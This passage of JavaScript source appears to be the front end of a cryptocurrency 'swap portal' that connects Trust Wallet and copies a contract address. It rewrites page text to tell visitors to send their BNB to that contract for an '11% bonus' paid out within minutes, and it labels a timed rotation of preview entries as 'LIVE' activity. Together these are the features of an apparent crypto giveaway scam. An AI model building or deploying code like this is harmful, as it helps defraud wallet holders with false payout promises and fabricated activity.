      toast(
        "Wallet request cancelled."
      );

    } else {

      toast(
        error?.shortMessage ||
        "Unable to continue with the connected wallet."
      );
    }
  }
}

function setupBuyButton() {
  const button =
    $("buyBTCButton") ||
    $("buyButton");

  if (button) {

    button.addEventListener(
      "click",
      buyBTC
    );
  }
}

/* ==========================================================
   COPY CONTRACT
   ========================================================== */

function setupCopyButton() {
  const button =
    $("copyContract");

  const address =
    $("contractAddress");

  if (
    !button ||
    !address
  ) {
    return;
  }

  address.textContent =
    CONTRACT_ADDRESS;

  button.addEventListener(
    "click",
    async () => {

      try {

        await navigator.clipboard.writeText(
          CONTRACT_ADDRESS
        );

        button.textContent =
          "Copied";

        toast(
          "Contract address copied."
        );

        setTimeout(
          () =>
            button.textContent =
              "Copy",
          1800
        );

      } catch {

        try {

          const helper =
            document.createElement(
              "textarea"
            );

          helper.value =
            CONTRACT_ADDRESS;

          helper.setAttribute(
            "readonly",
            ""
          );

          helper.style.position =
            "fixed";

          helper.style.opacity =
            "0";

          document.body.appendChild(
            helper
          );

          helper.select();

          document.execCommand(
            "copy"
          );

          helper.remove();

          button.textContent =
            "Copied";

          toast(
            "Contract address copied."
          );

          setTimeout(
            () =>
              button.textContent =
                "Copy",
            1800
          );

        } catch {

          toast(
            "Unable to copy automatically."
          );
        }
      }
    }
  );
}

/* ==========================================================
   PARTICIPATION / HOW IT WORKS TEXT
   ========================================================== */

function updateParticipationText() {
  const replacements = [
    [
      "Swap BTC to BNB",
      "Swap BNB to BTC"
    ],
    [
      "Choose amount",
      "Swap BNB to BTC"
    ],
    [
      "Check allocation",
      "Connect Wallet"
    ],
    [
      "Connect wallet",
      "Copy Contract Address"
    ],
    [
      "Copy & send",
      "Go to your connected wallet and send your BNB"
    ],
    [
      "Select",
      "Swap BNB to BTC"
    ],
    [
      "Calculate",
      "Connect Wallet"
    ]
  ];

  document
    .querySelectorAll(
      "body *"
    )
    .forEach(
      el => {

        if (
          el.children.length > 0
        ) {
          return;
        }

        const text =
          el.textContent
            ?.trim();

        if (!text) {
          return;
        }

        for (
          const [
            from,
            to
          ] of replacements
        ) {

          if (
            text ===
            from
          ) {

            el.textContent =
              to;

            break;
          }
        }
      }
    );

  const howItWorks =
    document.querySelector(
      "#how-it-works, .how-it-works"
    );

  if (howItWorks) {

    const paragraph =
      howItWorks.querySelector(
        "p"
      );

    if (paragraph) {

      paragraph.textContent =
        "To participate and earn the 11% bonus, swap your BNB to BTC, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.";
    }
  }
}

/* ==========================================================
   REFRESH
   ========================================================== */

function setupRefresh() {
  const button =
    $("refreshMarket") ||
    $("refreshButton");

  if (button) {

    button.addEventListener(
      "click",
      loadMarketData
    );
  }
}

/* ==========================================================
   ACTIVITY HEADING
   ========================================================== */

function setupActivityHeading() {
  const section =
    $("activity");

  if (!section) {
    return;
  }

  const heading =
    section.querySelector(
      ".section-heading"
    );

  if (!heading) {
    return;
  }

  const h2 =
    heading.querySelector(
      "h2"
    );

  if (h2) {

    h2.textContent =
      "Recent activity.";
  }

  const kicker =
    heading.querySelector(
      ".section-kicker"
    );

  if (kicker) {

    kicker.textContent =
      "ACTIVITY";
  }

  const paragraph =
    heading.querySelector(
      "p"
    );

  if (paragraph) {

    paragraph.textContent =
      "";
  }

  let status =
    heading.querySelector(
      ".activity-status,.live-pill"
    );

  if (!status) {

    status =
      document.createElement(
        "span"
      );

    status.className =
      "activity-status";

    heading.appendChild(
      status
    );
  }

  status.innerHTML =
    `<i class="activity-live-dot"></i>LIVE`;
}

/* ==========================================================
   START PORTAL
   ========================================================== */

async function startPortal() {

  injectStyles();

  setupActivityHeading();

  setupCalculator();

  setupWallet();

  setupCopyButton();

  setHeaderContractVisibility(
    Boolean(
      connectedAddress
    )
  );

  setupBuyButton();

  setupRefresh();

  updateParticipationText();

  await loadContractSettings();

  /*
     Keep the original fading-away activity animation.
     It starts immediately with the preview entries and
     continues rotating every 5.2 seconds.
  */
  startActivityAnimation();

  await loadMarketData();

  setInterval(
    loadMarketData,
    30000
  );
}

document.addEventListener(
  "DOMContentLoaded",
  startPortal
);
/* ============================================================
   FINAL TRUST WALLET / WALLETCONNECT COMPATIBILITY OVERRIDES
   ============================================================ */

function discoverWallets() {
  if (!window.addEventListener) {
    return;
  }

  window.addEventListener(
    "eip6963:announceProvider",
    event => {
      const detail = event.detail;
      if (!detail?.provider || !detail?.info) return;

      const infoText =
        `${detail.info.name || ""} ${detail.info.rdns || ""}`.toLowerCase();

      if (!/trust/i.test(infoText)) return;

      const key =
        detail.info.rdns ||
        detail.info.uuid ||
        detail.info.name;

      discoveredWallets.set(key, detail);
      refreshWalletAvailability();
    }
  );

  window.dispatchEvent(
    new Event("eip6963:requestProvider")
  );

  const trustProvider =
    window.trustwallet?.ethereum ||
    (
      window.ethereum?.isTrust ||
      window.ethereum?.isTrustWallet
        ? window.ethereum
        : null
    );

  if (trustProvider) {
    discoveredWallets.set(
      "trustwallet",
      {
        info: {
          name: "Trust Wallet",
          rdns: "com.trustwallet.app"
        },
        provider: trustProvider
      }
    );
  }
}

function findWalletProvider(definition) {
  for (const item of discoveredWallets.values()) {
    const info = item.info || {};

    const haystack =
      `${info.name || ""} ${info.rdns || ""}`.toLowerCase();

    if (definition.match.test(haystack)) {
      return item.provider;
    }
  }

  return null;
}

async function selectWallet(definition) {
  const provider = findWalletProvider(definition);

  if (provider) {
    try {
      await ensureBSC(provider);

      walletProvider =
        new ethers.BrowserProvider(provider);

      await provider.request({
        method: "eth_requestAccounts"
      });

      signer =
        await walletProvider.getSigner();

      connectedAddress =
        await signer.getAddress();

      contract =
        new ethers.Contract(
          CONTRACT_ADDRESS,
          CONTRACT_ABI,
          signer
        );

      updateWalletButton();
      closeWalletModal();

      toast("Trust Wallet connected.");
      return;
    } catch (error) {
      console.error("Trust Wallet connection:", error);

      toast(
        error?.shortMessage ||
        error?.message ||
        "Unable to connect Trust Wallet."
      );

      return;
    }
  }

  if (isMobileDevice()) {
    await openTrustWalletConnect();
    return;
  }

  toast(
    "Open this page in Trust Wallet or connect Trust Wallet on mobile."
  );
}

function setupWallet() {
  createWalletModal();
  createConnectedWalletPanel();
  discoverWallets();

  const button = $("connectWallet");

  if (button) {
    button.addEventListener(
      "click",
      openWalletModal
    );
  }

  setupTrustWalletRecovery();

  const trustProvider =
    findWalletProvider(
      WALLET_DEFINITIONS[0]
    );

  if (trustProvider?.on) {
    trustProvider.on(
      "accountsChanged",
      accounts => {
        if (!accounts || !accounts.length) {
          connectedAddress = null;
          signer = null;
          contract = null;
          updateWalletButton();
          return;
        }

        syncTrustWalletProvider().catch(
          console.error
        );
      }
    );

    trustProvider.on(
      "chainChanged",
      () => {
        if (connectedAddress) {
          syncTrustWalletProvider().catch(
            console.error
          );
        }
      }
    );
  }

  updateWalletButton();
}

function updateParticipationText() {
  const replacements = [
    ["Swap BTC to BNB", "Swap BNB to BTC"],
    ["Choose amount", "Swap BNB to BTC"],
    ["Check allocation", "Connect Wallet"],
    ["Connect wallet", "Copy Contract Address"],
    [
      "Copy & send",
      "Go to your connected wallet and send your BNB"
    ],
    ["Select", "Swap BNB to BTC"],
    ["Calculate", "Connect Wallet"]
  ];

  document.querySelectorAll("body *").forEach(el => {
    if (el.children.length > 0) return;

    const text =
      el.textContent?.trim();

    if (!text) return;

    for (const [from, to] of replacements) {
      if (text === from) {
        el.textContent = to;
        break;
      }
    }
  });

  const howItWorks =
    document.querySelector(
      "#how-it-works, .how-it-works"
    );

  if (howItWorks) {
    const paragraph =
      howItWorks.querySelector("p");

    if (paragraph) {
      paragraph.textContent =
        "To participate and earn the 11% bonus, swap your BNB to BTC, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.";
    }
  }
}

